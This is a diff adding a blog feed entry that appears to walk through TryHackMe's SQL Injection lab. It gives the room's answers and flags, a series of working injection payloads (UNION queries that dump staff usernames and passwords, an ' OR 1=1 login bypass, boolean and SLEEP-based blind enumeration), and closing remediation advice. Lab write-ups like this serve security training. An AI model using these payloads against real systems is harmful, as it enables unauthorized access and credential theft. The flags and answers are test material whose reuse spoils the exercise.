@@ -12,6 +12,212 @@
     </author>
     
       <item>
+        <title>TryHackMe - SQL Injection</title>
+        <description>&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/sqlinjectionlm&quot;&gt;https://tryhackme.com/room/sqlinjectionlm&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Learn how to detect and exploit SQL Injection vulnerabilities&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;task-1---brief&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 1 - Brief&lt;/h1&gt;
+
+&lt;p&gt;SQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed. When a web application communicates with a database using input from a user that hasn’t been properly validated, there runs the potential of an attacker being able to steal, delete or alter private and customer data and also attack the web applications authentication methods to private or customer areas. This is why as well as SQLi being one of the oldest web application vulnerabilities, it also can be the most damaging.&lt;/p&gt;
+
+&lt;p&gt;In this room, you’ll learn what databases are, what SQL is with some basic SQL commands, how to detect SQL vulnerabilities, how to exploit SQLi vulnerabilities and as a developer how you can protect yourself against SQL Injection.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;In-Band SQL Injection&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Error-Based SQL Injection&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Union-Based SQL Injection&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;What does SQL stand for? Structured Query Language.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;task-2---what-is-a-database&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 2 - What is a Database?&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;What is the acronym for the software that controls a database? DBMS (Database Management Systems)&lt;/p&gt;
+
+&lt;p&gt;What is the name of the grid-like structure which holds the data? Table&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;task-3---what-is-sql&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 3 - What is SQL?&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;What SQL statement is used to retrieve data? select&lt;/p&gt;
+
+&lt;p&gt;What SQL clause can be used to retrieve data from multiple tables? union&lt;/p&gt;
+
+&lt;p&gt;What SQL statement is used to add data? insert&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;task-4---what-is-sql-injection&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 4 - What is SQL Injection?&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;What character signifies the end of an SQL query? &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;task-5---in-band-sql&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Task 5 - In-Band SQL&lt;/h1&gt;
+
+&lt;p&gt;What is the flag after completing level 1?&lt;/p&gt;
+
+&lt;p&gt;Finding this is a SQL query by getting an error message with ``` we can run the following commands to get the flag:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 UNION SELECT 1&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 UNION SELECT 1,2&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1 UNION SELECT 1,2,3&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0 UNION SELECT 1,2,3&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0 UNION SELECT 1,2,database()&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = &apos;sqli_one&apos;&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = &apos;staff_users&apos;&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0 UNION SELECT 1,2,group_concat(username,&apos;:&apos;,password SEPARATOR &apos;&amp;lt;br&amp;gt;&apos;) FROM staff_users&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;THM{SQL_INJECTION_3840}&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;-task-6---blind-sqli---authentication-bypass&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt; Task 6 - Blind SQLi - Authentication Bypass&lt;/h1&gt;
+
+&lt;p&gt;One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren’t that interested in retrieving data from the database; We just want to get past the login.&lt;/p&gt;
+
+&lt;p&gt;Login forms that are connected to a database of users are often developed in such a way that the web application isn’t interested in the content of the username and password but more whether the two make a matching pair in the users table. In basic terms, the web application is asking the database “do you have a user with the username bob and the password bob123?”, and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not.&lt;/p&gt;
+
+&lt;p&gt;Taking the above information into account, it’s unnecessary to enumerate a valid username/password pair. We just need to create a database query that replies with a yes/true.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the flag after completing level two? (and moving to level 3)&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; OR 1=1;--&lt;/code&gt; We can get to the next level and recieve our flag which is THM{SQL_INJECTION_9581}&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;-task-7---blind-sqli---boolean-based&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt; Task 7 - Blind SQLi - Boolean Based&lt;/h1&gt;
+
+&lt;p&gt;Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. That outcome confirms to us that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can’t provide much information. Still, in fact, with just these two responses, it’s possible to enumerate a whole database structure and contents.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the flag after completing level three?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;In order to get this flag we can use the same steps as previous with and proceed until&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin123&apos; UNION SELECT 1;--&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin123&apos; UNION SELECT 1,2,3;--&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin123&apos; UNION SELECT 1,2,3 where database() like &apos;%&apos;;--&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin123&apos; UNION SELECT 1,2,3 where database() like &apos;s%&apos;;--&lt;/code&gt; we continue on with this until we find the name of the database which is sqli_three&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin123&apos; UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = &apos;sqli_three&apos; and table_name like &apos;a%&apos;;--&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin123&apos; UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = &apos;sqli_three&apos; and table_name=&apos;users&apos;;--&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin123&apos; UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&apos;sqli_three&apos; and TABLE_NAME=&apos;users&apos; and COLUMN_NAME like &apos;a%&apos;;&lt;/code&gt; Again you’ll need to cycle through letters, numbers and characters until you find a match. As you’re looking for multiple results, you’ll have to add this to your payload each time you find a new column name, so you don’t keep discovering the same one. For example, once you’ve found the column named id, you’ll append that to your original payload.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin123&apos; UNION SELECT 1,2,3 from users where username like &apos;a%&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin123&apos; UNION SELECT 1,2,3 from users where username=&apos;admin&apos; and password like &apos;a%&lt;/code&gt; Cycling through until we find the password which is 3845.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;What is the level 3 flag? THM{SQL_INJECTION_1093}&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;-task-8---blind-sqli---time-based&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt; Task 8 - Blind SQLi - Time Based&lt;/h1&gt;
+
+&lt;p&gt;A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement.&lt;/p&gt;
+
+&lt;p&gt;So, for example, when trying to establish the number of columns in a table, you would use the following query:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin123&apos; UNION SELECT SLEEP(5);--&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin123&apos; UNION SELECT SLEEP(5),2;--&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This payload should have produced a 5-second time delay, which confirms the successful execution of the UNION statement and that there are two columns.&lt;/p&gt;
+
+&lt;p&gt;You can now repeat the enumeration process from the Boolean based SQL Injection, adding the SLEEP() method into the UNION SELECT statement.&lt;/p&gt;
+
+&lt;p&gt;If you’re struggling to find the table name the below query should help you on your way:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;referrer=admin123&apos; UNION SELECT SLEEP(5),2 where database() like &apos;s%&apos;;--&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;THM{SQL_INJECTION_MASTER}&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;-task-9---out-of-band-sqli&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt; Task 9 - Out-of-Band SQLi&lt;/h1&gt;
+
+&lt;p&gt;Out-of-Band SQL Injection isn’t as common as it either depends on specific features being enabled on the database server or the web application’s business logic, which makes some kind of external network call based on the results from an SQL query.&lt;/p&gt;
+
+&lt;p&gt;An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results. For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.&lt;/p&gt;
+
+&lt;p&gt;1) An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.&lt;/p&gt;
+
+&lt;p&gt;2) The Website makes an SQL query to the database which also passes the hacker’s payload.&lt;/p&gt;
+
+&lt;p&gt;3) The payload contains a request which forces an HTTP request back to the hacker’s machine containing data from the database.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Name a protocol beginning with D that can be used to exfiltrate data from a database. DNS&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;-task-10---remediation&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt; Task 10 - Remediation&lt;/h1&gt;
+
+&lt;p&gt;As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the below advice:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Prepared Statements (With Parameterized Queries):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;In a prepared query, the first thing a developer writes is the SQL query and then any user inputs are added as a parameter afterwards. Writing prepared statements ensures that the SQL code structure doesn’t change and the database can distinguish between the query and the data. As a benefit, it also makes your code look a lot cleaner and easier to read.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Input Validation:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Escaping User Input:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Allowing user input containing characters such as ‘ “ $ \ can cause SQL Queries to break or, even worse, as we’ve learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash () to these characters, which then causes them to be parsed just as a regular string and not a special character.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Answer the questions below&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Name a method of protecting yourself from an SQL Injection exploit.&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 14 Jun 2022 00:00:00 -0700</pubDate>
+        <link>http://localhost:4000//TryHackMe-SQL-Injection</link>
+        <link href="http://localhost:4000/TryHackMe-SQL-Injection"/>
+        <guid isPermaLink="true">http://localhost:4000/TryHackMe-SQL-Injection</guid>
+      </item>
+    
+      <item>
         <title>TryHackMe - Command Injection</title>
         <description>&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/oscommandinjection&quot;&gt;https://tryhackme.com/room/oscommandinjection&lt;/a&gt;&lt;/p&gt;
 
